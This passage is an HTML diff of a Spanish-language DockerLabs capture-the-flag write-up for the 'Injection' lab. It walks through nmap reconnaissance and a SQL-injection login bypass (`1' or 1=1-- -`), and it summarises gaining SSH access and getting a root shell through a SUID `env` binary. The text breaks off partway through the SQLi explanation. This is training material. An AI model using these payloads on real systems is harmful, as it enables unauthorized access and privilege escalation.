@@ -1,0 +1,912 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Injection — DockerLabs Writeup | Brandeiks</title>
+  <meta name="description" content="Writeup de la máquina Injection de DockerLabs — Dificultad: Fácil. SQL Injection bypass → credenciales dylan → SSH → SUID env → root.">
+  <meta name="author" content="Brandon Zevallos Pastrana">
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%2300ff88' rx='20'/%3E%3Ctext x='50%25' y='50%25' text-anchor='middle' dy='.35em' font-size='70' font-weight='bold' fill='%23050a0e' font-family='monospace'%3EB%3C/text%3E%3C/svg%3E">
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@300;400;600;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet"/>
+  <style>
+    :root {
+      --bg:       #050a0e;
+      --bg2:      #080f14;
+      --bg3:      #0a1520;
+      --green:    #00ff88;
+      --red:      #ff2d55;
+      --yellow:   #ffd700;
+      --orange:   #ff8c00;
+      --purple:   #bf5fff;
+      --dim:      #1a2a2e;
+      --text:     #c8d8e0;
+      --text-dim: #4a6a74;
+      --font-mono:'Share Tech Mono', monospace;
+      --font-main:'Rajdhani', sans-serif;
+      --font-disp:'Orbitron', sans-serif;
+    }
+    *{margin:0;padding:0;box-sizing:border-box;}
+    html{scroll-behavior:smooth;}
+    body{background:var(--bg);color:var(--text);font-family:var(--font-main);overflow-x:hidden;cursor:none;}
+    body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,136,.012) 2px,rgba(0,255,136,.012) 4px);pointer-events:none;z-index:1000;}
+    a,button{cursor:none;}
+    .cursor{position:fixed;width:10px;height:10px;background:var(--green);border-radius:50%;pointer-events:none;z-index:9999;transform:translate(-50%,-50%);box-shadow:0 0 12px var(--green);opacity:0;}
+    .cursor-ring{position:fixed;width:36px;height:36px;border:1px solid var(--green);border-radius:50%;pointer-events:none;z-index:9998;transform:translate(-50%,-50%);opacity:0;transition:all .12s ease;}
+    nav{position:fixed;top:0;left:0;right:0;z-index:500;display:flex;justify-content:space-between;align-items:center;padding:1.2rem 4rem;background:rgba(5,10,14,.92);backdrop-filter:blur(10px);border-bottom:1px solid rgba(0,255,136,.08);}
+    .nav-logo{font-family:var(--font-disp);font-size:1rem;color:var(--green);letter-spacing:4px;text-decoration:none;}
+    .nav-back{font-family:var(--font-mono);font-size:.78rem;color:var(--text-dim);text-decoration:none;letter-spacing:2px;transition:color .3s;}
+    .nav-back::before{content:'← ';}
+    .nav-back:hover{color:var(--green);}
+
+    .writeup-hero{min-height:42vh;display:flex;align-items:flex-end;padding:8rem 4rem 3rem;position:relative;overflow:hidden;border-bottom:1px solid var(--dim);}
+    .hero-grid{position:absolute;inset:0;background-image:linear-gradient(rgba(0,255,136,.03) 1px,transparent 1px),linear-gradient(90deg,rgba(0,255,136,.03) 1px,transparent 1px);background-size:60px 60px;}
+    .hero-glow{position:absolute;width:600px;height:400px;background:radial-gradient(ellipse,rgba(0,255,136,.07) 0%,transparent 70%);top:0;left:0;pointer-events:none;}
+    .writeup-hero-content{position:relative;z-index:2;max-width:900px;}
+    .breadcrumb{font-family:var(--font-mono);font-size:.72rem;color:var(--text-dim);letter-spacing:2px;margin-bottom:1.2rem;}
+    .breadcrumb a{color:var(--text-dim);text-decoration:none;transition:color .2s;}
+    .breadcrumb a:hover{color:var(--green);}
+    .breadcrumb span{color:var(--green);}
+    .writeup-title{font-family:var(--font-disp);font-size:clamp(2.5rem,6vw,4.5rem);font-weight:900;letter-spacing:2px;line-height:1.1;}
+    .writeup-title span{color:var(--green);}
+    .writeup-subtitle{font-family:var(--font-mono);font-size:.85rem;color:var(--text-dim);margin-top:.8rem;letter-spacing:1px;}
+    .writeup-meta{display:flex;flex-wrap:wrap;gap:1rem;align-items:center;margin-top:1.8rem;}
+    .meta-badge{font-family:var(--font-mono);font-size:.68rem;letter-spacing:2px;padding:.3rem .8rem;border:1px solid;}
+    .badge-facil  {color:var(--green); border-color:rgba(0,255,136,.4); background:rgba(0,255,136,.05);}
+    .badge-docker {color:var(--green); border-color:rgba(0,255,136,.3); background:rgba(0,255,136,.05);}
+    .badge-linux  {color:var(--yellow);border-color:rgba(255,215,0,.3);  background:rgba(255,215,0,.05);}
+    .badge-sqli   {color:var(--red);   border-color:rgba(255,45,85,.4);  background:rgba(255,45,85,.05);}
+    .badge-suid   {color:var(--orange);border-color:rgba(255,140,0,.4);  background:rgba(255,140,0,.05);}
+    .meta-date{font-family:var(--font-mono);font-size:.7rem;color:var(--text-dim);}
+
+    .writeup-layout{display:grid;grid-template-columns:1fr 240px;gap:3rem;max-width:1300px;margin:0 auto;padding:4rem;}
+    .sidebar{position:sticky;top:5rem;height:fit-content;order:2;}
+    .sidebar-box{border:1px solid var(--dim);padding:1.5rem;background:var(--bg2);margin-bottom:1.5rem;}
+    .sidebar-title{font-family:var(--font-mono);font-size:.65rem;color:var(--green);letter-spacing:3px;margin-bottom:1.2rem;}
+    .toc-list{list-style:none;display:flex;flex-direction:column;gap:.4rem;}
+    .toc-list a{font-family:var(--font-mono);font-size:.7rem;color:var(--text-dim);text-decoration:none;letter-spacing:1px;transition:all .2s;display:block;padding:.25rem .8rem;border-left:2px solid transparent;}
+    .toc-list a:hover,.toc-list a.active{color:var(--green);border-left-color:var(--green);}
+    .info-row{display:flex;justify-content:space-between;align-items:center;margin-bottom:.8rem;}
+    .info-label{font-family:var(--font-mono);font-size:.65rem;color:var(--text-dim);letter-spacing:1px;}
+    .info-val{font-family:var(--font-mono);font-size:.72rem;}
+    .val-green {color:var(--green);}
+    .val-yellow{color:var(--yellow);}
+    .val-red   {color:var(--red);}
+    .val-orange{color:var(--orange);}
+
+    .attack-path{display:flex;flex-direction:column;gap:0;}
+    .ap-item{display:flex;align-items:flex-start;gap:.8rem;padding:.5rem 0;}
+    .ap-dot{width:8px;height:8px;background:var(--green);border-radius:50%;margin-top:4px;flex-shrink:0;box-shadow:0 0 6px var(--green);}
+    .ap-line{width:1px;height:16px;background:rgba(0,255,136,.2);margin:0 3.5px;}
+    .ap-text{font-family:var(--font-mono);font-size:.65rem;color:var(--text-dim);line-height:1.5;}
+    .ap-text span{color:var(--green);}
+
+    .writeup-content{min-width:0;order:1;}
+    .progress-container{position:fixed;top:0;left:0;width:100%;height:3px;background:transparent;z-index:1001;}
+    .progress-bar{height:100%;background:var(--green);width:0%;transition:width .15s ease;box-shadow:0 0 8px var(--green);}
+    .skip-link{position:absolute;top:-40px;left:0;background:var(--green);color:var(--bg);padding:8px 16px;z-index:10000;text-decoration:none;font-family:var(--font-mono);font-size:.8rem;transition:top .2s;}
+    .skip-link:focus{top:0;}
+
+    .copy-btn{position:absolute;top:.5rem;right:4.5rem;background:var(--dim);border:1px solid rgba(0,255,136,.3);color:var(--text-dim);font-family:var(--font-mono);font-size:.62rem;padding:.15rem .5rem;letter-spacing:1px;cursor:none;opacity:0;transition:opacity .2s,background .2s,color .2s;z-index:10;white-space:nowrap;}
+    .cmd-block:hover .copy-btn{opacity:1;}
+    .copy-btn:hover{background:var(--green);color:var(--bg);border-color:var(--green);}
+    .copy-btn.copied{background:var(--green);color:var(--bg);border-color:var(--green);opacity:1;}
+    .toast{position:fixed;bottom:24px;right:24px;background:var(--green);color:#000;padding:.7rem 1.4rem;font-family:var(--font-mono);font-size:.75rem;letter-spacing:2px;font-weight:600;opacity:0;transform:translateY(8px);transition:opacity .25s,transform .25s;pointer-events:none;z-index:10000;}
+    .toast.show{opacity:1;transform:translateY(0);}
+
+    .section{margin-bottom:4rem;opacity:0;transform:translateY(20px);transition:opacity .5s ease,transform .5s ease;}
+    .section.visible{opacity:1;transform:translateY(0);}
+    .section-label{font-family:var(--font-mono);font-size:.68rem;color:var(--green);letter-spacing:4px;margin-bottom:.5rem;}
+    .section-title{font-family:var(--font-disp);font-size:1.5rem;font-weight:700;letter-spacing:2px;margin-bottom:.6rem;}
+    .section-line{width:40px;height:2px;background:var(--green);margin-bottom:2rem;}
+
+    .prose p{font-size:1.05rem;line-height:1.9;color:var(--text-dim);margin-bottom:1rem;}
+    .prose p strong{color:var(--text);}
+    .prose p .hl    {color:var(--green);font-weight:bold;}
+    .prose p .hl-red{color:var(--red);}
+    .prose p .hl-yel{color:var(--yellow);}
+    .prose p .hl-ora{color:var(--orange);}
+    .prose p .hl-pur{color:var(--purple);}
+
+    .step-marker{display:flex;align-items:center;gap:1rem;margin-bottom:1.2rem;margin-top:2.5rem;}
+    .step-num{font-family:var(--font-disp);font-size:.65rem;color:var(--bg);background:var(--green);width:26px;height:26px;display:flex;align-items:center;justify-content:center;flex-shrink:0;font-weight:900;}
+    .step-title{font-family:var(--font-mono);font-size:.8rem;color:var(--green);letter-spacing:2px;}
+
+    .cmd-block{background:var(--bg3);border:1px solid rgba(0,255,136,.15);border-left:3px solid var(--green);padding:1rem 1.2rem;margin:1rem 0;font-family:var(--font-mono);font-size:.82rem;overflow-x:auto;position:relative;line-height:1.8;}
+    .cmd-block .cmd-label{position:absolute;top:.5rem;right:.8rem;font-size:.6rem;color:var(--text-dim);letter-spacing:2px;}
+    .cmd-block .prompt     {color:var(--green);user-select:none;}
+    .cmd-block .prompt-ssh {color:var(--yellow);user-select:none;}
+    .cmd-block .prompt-root{color:var(--red);user-select:none;}
+    .cmd-block .cmd  {color:var(--text);}
+    .cmd-block .flag {color:var(--green);}
+    .cmd-block .arg  {color:var(--yellow);}
+    .cmd-block .sqli {color:var(--red);}
+    .cmd-block .comment{color:var(--text-dim);font-size:.75rem;}
+
+    .output-block{background:#020608;border:1px solid var(--dim);padding:1rem 1.2rem;margin:.5rem 0 1.5rem;font-family:var(--font-mono);font-size:.77rem;line-height:1.9;color:var(--text-dim);overflow-x:auto;}
+    .output-block .o-green {color:var(--green);}
+    .output-block .o-red   {color:var(--red);}
+    .output-block .o-yellow{color:var(--yellow);}
+    .output-block .o-orange{color:var(--orange);}
+    .output-block .o-white {color:var(--text);}
+
+    .info-box{border:1px solid rgba(0,255,136,.2);background:rgba(0,255,136,.04);padding:1.2rem 1.5rem;margin:1.2rem 0;}
+    .info-box-title{font-family:var(--font-mono);font-size:.65rem;color:var(--green);letter-spacing:3px;margin-bottom:.6rem;}
+    .info-box p{font-family:var(--font-mono);font-size:.78rem;color:var(--text-dim);line-height:1.7;}
+    .info-box p strong{color:var(--green);}
+
+    .warn-box{border:1px solid rgba(255,140,0,.25);background:rgba(255,140,0,.04);padding:1.2rem 1.5rem;margin:1.2rem 0;}
+    .warn-box-title{font-family:var(--font-mono);font-size:.65rem;color:var(--orange);letter-spacing:3px;margin-bottom:.6rem;}
+    .warn-box p{font-family:var(--font-mono);font-size:.78rem;color:var(--text-dim);line-height:1.7;}
+    .warn-box p strong{color:var(--orange);}
+
+    .vuln-box{border:1px solid rgba(255,45,85,.3);background:rgba(255,45,85,.04);padding:1.2rem 1.5rem;margin:1.2rem 0;}
+    .vuln-box-title{font-family:var(--font-mono);font-size:.65rem;color:var(--red);letter-spacing:3px;margin-bottom:.6rem;}
+    .vuln-box p{font-family:var(--font-mono);font-size:.78rem;color:var(--text-dim);line-height:1.7;}
+    .vuln-box p strong{color:var(--red);}
+
+    .cred-box{border:1px solid rgba(0,255,136,.25);background:rgba(0,255,136,.04);padding:1.2rem 1.5rem;margin:1.2rem 0;display:flex;gap:2rem;flex-wrap:wrap;}
+    .cred-item .cred-label{font-family:var(--font-mono);font-size:.6rem;color:var(--text-dim);letter-spacing:2px;margin-bottom:.3rem;}
+    .cred-item .cred-val{font-family:var(--font-mono);font-size:.95rem;color:var(--green);}
+
+    .vuln-table{width:100%;border-collapse:collapse;margin:1.5rem 0;}
+    .vuln-table th,.vuln-table td{font-family:var(--font-mono);font-size:.72rem;padding:.8rem 1rem;text-align:left;border-bottom:1px solid var(--dim);}
+    .vuln-table th{color:var(--green);letter-spacing:2px;border-bottom-color:rgba(0,255,136,.2);}
+    .vuln-table td{color:var(--text-dim);}
+    .vuln-table td:first-child{color:var(--green);}
+
+    hr.divider{border:none;height:1px;background:linear-gradient(90deg,rgba(0,255,136,.3),transparent);margin:3rem 0;}
+
+    .cmd-ref-grid{display:grid;grid-template-columns:1fr 1fr;gap:1.2rem;margin-top:1.5rem;}
+    .cmd-ref-card{border:1px solid var(--dim);background:var(--bg2);padding:1.5rem;transition:border-color .3s;}
+    .cmd-ref-card:hover{border-color:rgba(0,255,136,.25);}
+    .cmd-ref-name{font-family:var(--font-mono);font-size:.9rem;color:var(--green);margin-bottom:.5rem;letter-spacing:1px;}
+    .cmd-ref-syntax{font-family:var(--font-mono);font-size:.72rem;color:var(--green);background:var(--bg3);padding:.4rem .7rem;margin-bottom:.8rem;display:inline-block;}
+    .cmd-ref-desc{font-size:.92rem;color:var(--text-dim);line-height:1.7;margin-bottom:.8rem;}
+    .cmd-ref-flags{list-style:none;display:flex;flex-direction:column;gap:.3rem;}
+    .cmd-ref-flags li{font-family:var(--font-mono);font-size:.7rem;color:var(--text-dim);}
+    .cmd-ref-flags li span{color:var(--yellow);}
+
+    .glosario-grid{display:grid;grid-template-columns:1fr;gap:1rem;margin-top:1.5rem;}
+    .glos-card{border:1px solid var(--dim);background:var(--bg2);padding:1.4rem 1.5rem;transition:border-color .3s;}
+    .glos-card:hover{border-color:rgba(0,255,136,.2);}
+    .glos-term{font-family:var(--font-mono);font-size:.88rem;color:var(--green);margin-bottom:.4rem;letter-spacing:1px;}
+    .glos-def{font-size:.95rem;color:var(--text-dim);line-height:1.75;}
+    .glos-def strong{color:var(--text);}
+    .glos-def code{font-family:var(--font-mono);font-size:.82rem;color:var(--green);background:var(--bg3);padding:.1rem .4rem;}
+
+    footer{padding:2rem 4rem;border-top:1px solid var(--dim);display:flex;justify-content:space-between;align-items:center;margin-top:4rem;}
+    footer p{font-family:var(--font-mono);font-size:.7rem;color:var(--text-dim);letter-spacing:1px;}
+    footer span{color:var(--green);}
+
+    @media(max-width:960px){
+      nav,.writeup-hero,footer{padding-left:1.5rem;padding-right:1.5rem;}
+      .writeup-layout{grid-template-columns:1fr;padding:2rem 1.5rem;}
+      .sidebar{position:static;}
+      .cmd-ref-grid{grid-template-columns:1fr;}
+      body,a,button{cursor:auto;}
+      .cursor,.cursor-ring{display:none;}
+    }
+  </style>
+</head>
+<body>
+
+<a href="#main-content" class="skip-link">Saltar al contenido principal</a>
+<div class="progress-container"><div class="progress-bar" id="readingProgress"></div></div>
+<div class="cursor" id="cursor"></div>
+<div class="cursor-ring" id="cursorRing"></div>
+
+<nav>
+  <a href="../../index.html" class="nav-logo">BRANDEIKS_SEC</a>
+  <a href="../../index.html" class="nav-back">volver al portafolio</a>
+</nav>
+
+<!-- HERO -->
+<div class="writeup-hero">
+  <div class="hero-grid"></div>
+  <div class="hero-glow"></div>
+  <div class="writeup-hero-content">
+    <p class="breadcrumb">
+      <a href="../../index.html">brandeiks</a> /
+      <a href="../">writeups</a> /
+      <a href="../../writeups/dockerlabs/">dockerlabs</a> /
+      <span>injection</span>
+    </p>
+    <h1 class="writeup-title"><span>Injection</span></h1>
+    <p class="writeup-subtitle">DockerLabs — Linux · SQL Injection bypass → credenciales en claro → SSH dylan → SUID env → root</p>
+    <div class="writeup-meta">
+      <span class="meta-badge badge-facil">● FÁCIL</span>
+      <span class="meta-badge badge-docker">DOCKERLABS</span>
+      <span class="meta-badge badge-linux">LINUX</span>
+      <span class="meta-badge badge-sqli">SQL INJECTION</span>
+      <span class="meta-badge badge-suid">SUID · PrivEsc</span>
+      <span class="meta-date">📅 Mayo 2026 · By Brandeiks</span>
+    </div>
+  </div>
+</div>
+
+<!-- LAYOUT -->
+<div class="writeup-layout">
+
+  <!-- SIDEBAR -->
+  <aside class="sidebar">
+    <div class="sidebar-box">
+      <p class="sidebar-title">// ÍNDICE</p>
+      <ul class="toc-list">
+        <li><a href="#resumen">01 · Resumen</a></li>
+        <li><a href="#despliegue">02 · Despliegue</a></li>
+        <li><a href="#reconocimiento">03 · Reconocimiento</a></li>
+        <li><a href="#sqli">04 · SQL Injection</a></li>
+        <li><a href="#acceso">05 · Acceso SSH</a></li>
+        <li><a href="#privesc">06 · Escalada · SUID env</a></li>
+        <li><a href="#referencia">07 · Referencia de Comandos</a></li>
+        <li><a href="#glosario">08 · Glosario</a></li>
+      </ul>
+    </div>
+    <div class="sidebar-box">
+      <p class="sidebar-title">// INFO</p>
+      <div class="info-row"><span class="info-label">Plataforma</span><span class="info-val val-green">DockerLabs</span></div>
+      <div class="info-row"><span class="info-label">OS</span><span class="info-val val-yellow">Linux (Ubuntu)</span></div>
+      <div class="info-row"><span class="info-label">Dificultad</span><span class="info-val val-green">Fácil</span></div>
+      <div class="info-row"><span class="info-label">IP Target</span><span class="info-val" style="color:var(--text)">172.17.0.2</span></div>
+      <div class="info-row"><span class="info-label">Puertos</span><span class="info-val val-green">22 SSH · 80 HTTP</span></div>
+      <div class="info-row"><span class="info-label">Vuln</span><span class="info-val val-red">SQLi · SUID env</span></div>
+      <div class="info-row"><span class="info-label">Estado</span><span class="info-val val-green">● Pwned</span></div>
+    </div>
+    <div class="sidebar-box">
+      <p class="sidebar-title">// ATTACK PATH</p>
+      <div class="attack-path">
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>auto_deploy.sh</span> → laboratorio activo en 172.17.0.2</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>nmap</span> → 22 SSH · 80 Apache 2.4.52</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>:80</span> → formulario Login PHP con SQLi</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>1' or 1=1-- -</span> → bypass + password en claro</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>SSH dylan</span> → acceso con creds reveladas</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>find SUID</span> → /usr/bin/env con bit SUID</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>GTFObins env</span> → env /bin/sh -p</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot" style="background:var(--green);box-shadow:0 0 6px var(--green)"></div><div class="ap-text"><span style="color:var(--green)">ROOT</span> → whoami = root · /root accesible</div></div>
+      </div>
+    </div>
+  </aside>
+
+  <!-- CONTENT -->
+  <main class="writeup-content" id="main-content">
+
+    <!-- RESUMEN -->
+    <div class="section" id="resumen">
+      <p class="section-label">// 01</p>
+      <h2 class="section-title">Resumen</h2>
+      <div class="section-line"></div>
+      <div class="prose">
+        <p>
+          <strong>Injection</strong> es una máquina de dificultad <span class="hl">fácil</span>
+          de DockerLabs diseñada para practicar la vulnerabilidad de
+          <span class="hl-red">inyección SQL</span> y la posterior
+          <strong>escalada de privilegios</strong> en Linux. La máquina corre sobre
+          Ubuntu y expone dos servicios: SSH en el puerto 22 y un servidor web
+          Apache en el puerto 80.
+        </p>
+        <p>
+          El vector de entrada es un formulario de login PHP vulnerable a
+          <span class="hl-red">SQL Injection clásica</span>. Al inyectar
+          <code style="color:var(--red)">1' or 1=1-- -</code> en el campo de usuario,
+          la consulta SQL siempre evalúa como verdadera, autenticando sin credenciales
+          válidas y revelando la contraseña en texto claro del usuario
+          <span class="hl">dylan</span>. Estas credenciales permiten acceso por SSH.
+        </p>
+        <p>
+          Una vez dentro, la escalada de privilegios se logra a través del binario
+          <span class="hl-ora">/usr/bin/env</span> con el <strong>bit SUID</strong>
+          activado. Consultando GTFObins, el comando
+          <code style="color:var(--green)">env /bin/sh -p</code> spawnea una shell
+          como <strong>root</strong> aprovechando que los privilegios efectivos
+          no son descartados.
+        </p>
+      </div>
+
+      <table class="vuln-table">
+        <thead>
+          <tr><th>Fase</th><th>Técnica / Herramienta</th><th>Resultado</th></tr>
+        </thead>
+        <tbody>
+          <tr><td>Despliegue</td><td>auto_deploy.sh injection.tar</td><td>Contenedor activo en 172.17.0.2</td></tr>
+          <tr><td>Reconocimiento</td><td>ping + nmap -p- -sSCV + xsltproc</td><td>22 SSH (OpenSSH 8.9p1) · 80 HTTP (Apache 2.4.52)</td></tr>
+          <tr><td>Enumeración Web</td><td>Navegador → :80</td><td>Login PHP con PHPSESSID — vulnerable a SQLi</td></tr>
+          <tr><td>Explotación</td><td>SQL Injection: 1' or 1=1-- -</td><td>Bypass auth + password dylan en claro</td></tr>
+          <tr><td>Acceso inicial</td><td>ssh dylan@172.17.0.2</td><td>Shell como usuario dylan</td></tr>
+          <tr><td>PrivEsc</td><td>find SUID + GTFObins env /bin/sh -p</td><td>Shell como root</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <hr class="divider">
+
+    <!-- DESPLIEGUE -->
+    <div class="section" id="despliegue">
+      <p class="section-label">// 02</p>
+      <h2 class="section-title">Despliegue del Laboratorio</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">1</div>
+        <span class="step-title">LANZAR EL CONTENEDOR DOCKERLABS</span>
+      </div>
+      <div class="prose">
+        <p>
+          DockerLabs usa un script de despliegue automático que levanta el contenedor
+          Docker con la máquina vulnerable y nos asigna su IP. Al ejecutar
+          <code style="color:var(--green)">auto_deploy.sh</code> con el archivo
+          <code style="color:var(--green)">injection.tar</code>, el sistema
+          despliega el laboratorio y nos indica la dirección IP asignada:
+          <span class="hl">172.17.0.2</span>. El proceso queda en primer plano
+          y se detiene con <strong>Ctrl+C</strong> cuando terminemos.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="sudo bash auto_deploy.sh injection.tar">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">DEPLOY</span>
+        <div><span class="prompt">$ </span><span class="cmd">sudo bash <span class="arg">auto_deploy.sh</span> <span class="arg">injection.tar</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>[sudo] password for kali:</div>
+        <div>&nbsp;</div>
+        <div><span class="o-green">Estamos desplegando la máquina vulnerable, espere un momento.</span></div>
+        <div>&nbsp;</div>
+        <div><span class="o-green">Máquina desplegada, su dirección IP es ─→ 172.17.0.2</span></div>
+        <div>&nbsp;</div>
+        <div><span class="o-red">Presiona Ctrl+C cuando termines con la máquina para eliminarla</span></div>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- RECONOCIMIENTO -->
+    <div class="section" id="reconocimiento">
+      <p class="section-label">// 03</p>
+      <h2 class="section-title">Reconocimiento</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">2</div>
+        <span class="step-title">VERIFICACIÓN DE CONECTIVIDAD CON PING</span>
+      </div>
+      <div class="prose">
+        <p>
+          Verificamos que el contenedor esté activo y accesible. El TTL de respuesta
+          es <span class="hl">64</span>, confirmando que es una máquina
+          <strong>Linux</strong> (TTL inicial 64, sin hops que lo reduzcan al ser
+          una red Docker local). La latencia de 0.3ms confirma que el contenedor
+          está corriendo en la misma máquina host.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="ping 172.17.0.2 -c 3">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">PING</span>
+        <div><span class="prompt">$ </span><span class="cmd">ping <span class="arg">172.17.0.2</span> <span class="flag">-c 3</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.</div>
+        <div>64 bytes from 172.17.0.2: icmp_seq=1 ttl=<span class="o-green">64</span> time=0.346 ms</div>
+        <div>64 bytes from 172.17.0.2: icmp_seq=2 ttl=<span class="o-green">64</span> time=0.166 ms</div>
+        <div>64 bytes from 172.17.0.2: icmp_seq=3 ttl=<span class="o-green">64</span> time=0.152 ms</div>
+        <div>&nbsp;</div>
+        <div>--- 172.17.0.2 ping statistics ---</div>
+        <div>3 packets transmitted, 3 received, <span class="o-green">0% packet loss</span>, time 2056ms</div>
+        <div>rtt min/avg/max/mdev = 0.152/0.221/0.346/0.088 ms</div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">3</div>
+        <span class="step-title">ESCANEO DE PUERTOS CON NMAP</span>
+      </div>
+      <div class="prose">
+        <p>
+          El escaneo revela <strong>dos puertos abiertos</strong>: el puerto 22 con
+          <span class="hl">OpenSSH 8.9p1</span> (Ubuntu) y el puerto 80 con
+          <span class="hl">Apache httpd 2.4.52</span>. El script NSE http-title
+          detecta "Iniciar Sesión" como título de la página, revelando un formulario
+          de login. El header http-cookie-flags muestra que la cookie
+          <code style="color:var(--green)">PHPSESSID</code> tiene el flag
+          <code style="color:var(--red)">httponly not set</code>, lo que indicaría
+          también vulnerabilidad a XSS, aunque no será necesario para esta máquina.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="sudo nmap -p- -sSCV -n -Pn --min-rate=5000 --open 172.17.0.2 -oX injection.xml">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">NMAP</span>
+        <div><span class="prompt">$ </span><span class="cmd">sudo nmap <span class="flag">-p-</span> <span class="flag">-sSCV</span> <span class="flag">-n</span> <span class="flag">-Pn</span> <span class="flag">--min-rate=5000</span> <span class="flag">--open</span> <span class="arg">172.17.0.2</span> <span class="flag">-oX</span> <span class="arg">injection.xml</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-29 00:55 -0400</div>
+        <div>Nmap scan report for 172.17.0.2</div>
+        <div>Host is up (0.000020s latency).</div>
+        <div>Not shown: 65533 closed tcp ports (reset)</div>
+        <div>&nbsp;</div>
+        <div>PORT&nbsp;&nbsp; STATE  SERVICE  VERSION</div>
+        <div><span class="o-white">22/tcp&nbsp; open&nbsp;&nbsp; ssh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)</span></div>
+        <div>| ssh-hostkey:</div>
+        <div>|&nbsp;&nbsp; 256 72:1f:e1:92:70:3f:21:a2:0a:c6:a6:0e:b8:a2:aa:d5 (ECDSA)</div>
+        <div>|_&nbsp; 256 8f:3a:cd:fc:03:26:ad:49:4a:6c:a1:89:39:f9:7c:22 (ED25519)</div>
+        <div><span class="o-green">80/tcp&nbsp; open&nbsp;&nbsp; http&nbsp;&nbsp;&nbsp;&nbsp; Apache httpd 2.4.52 ((Ubuntu))</span></div>
+        <div>|_http-title: Iniciar Sesi\xC3\xB3n</div>
+        <div>|_http-server-header: Apache/2.4.52 (Ubuntu)</div>
+        <div>| http-cookie-flags:</div>
+        <div>|&nbsp;&nbsp; /:</div>
+        <div>|&nbsp;&nbsp;&nbsp;&nbsp; PHPSESSID:</div>
+        <div>|_&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span class="o-red">httponly flag not set</span></div>
+        <div>MAC Address: BA:C1:B1:AF:59:90 (Unknown)</div>
+        <div>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</div>
+        <div>&nbsp;</div>
+        <div>Nmap done: 1 IP address (1 host up) scanned in 15.86 seconds</div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">4</div>
+        <span class="step-title">CONVERSIÓN DEL REPORTE NMAP A HTML</span>
+      </div>
+
+      <div class="cmd-block" data-cmd="xsltproc /usr/share/nmap/nmap.xsl injection.xml > injection.html">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">XSLTPROC</span>
+        <div><span class="prompt">$ </span><span class="cmd">xsltproc <span class="arg">/usr/share/nmap/nmap.xsl</span> <span class="arg">injection.xml</span> &gt; <span class="arg">injection.html</span></span></div>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- SQL INJECTION -->
+    <div class="section" id="sqli">
+      <p class="section-label">// 04</p>
+      <h2 class="section-title">SQL Injection — Bypass de Autenticación</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">5</div>
+        <span class="step-title">EXPLORACIÓN DEL PUERTO 80</span>
+      </div>
+      <div class="prose">
+        <p>
+          Navegamos a <code style="color:var(--green)">http://172.17.0.2</code> y
+          encontramos un formulario de login con dos campos: <strong>User</strong>
+          y <strong>Password</strong>. El título "Iniciar Sesión" y la cookie
+          <code style="color:var(--green)">PHPSESSID</code> ya nos indicaron que
+          el backend está desarrollado en <strong>PHP</strong>, lo que sugiere
+          una consulta SQL del tipo:
+        </p>
+        <p>
+          <code style="color:var(--red)">SELECT * FROM users WHERE user='$input' AND password='$pass'</code>
+        </p>
+        <p>
+          Esta construcción clásica es vulnerable a <span class="hl-red">SQL Injection</span>
+          si los parámetros no están sanitizados ni parametrizados con
+          <strong>prepared statements</strong>.
+        </p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">6</div>
+        <span class="step-title">INYECCIÓN SQL — BYPASS DE LOGIN</span>
+      </div>
+      <div class="prose">
+        <p>
+          Introducimos el payload clásico de bypass en el campo <strong>User</strong>
+          y cualquier valor en el campo Password. El payload funciona alterando
+          la lógica de la consulta SQL:
+        </p>
+        <p>
+          La consulta original sería:
+          <code style="color:var(--red)">SELECT * FROM users WHERE user='1' or 1=1-- -' AND password='...'</code>
+        </p>
+        <p>
+          El <code style="color:var(--red)">--</code> (comentario SQL) elimina
